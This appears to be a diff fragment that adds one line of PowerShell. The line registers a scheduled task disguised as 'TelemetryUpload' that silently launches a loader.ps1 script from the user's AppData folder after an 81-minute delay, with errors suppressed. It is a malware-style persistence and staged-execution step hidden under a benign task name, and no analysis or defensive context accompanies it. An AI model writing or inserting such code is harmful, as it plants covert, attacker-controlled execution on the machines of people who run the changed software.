@@ -1,0 +1,2 @@
+
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(81); Register-ScheduledTask -TaskName 'TelemetryUpload' -Action $TaskAction -Trigger $TaskTrigger -Force -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Location -Path $env:TEMP
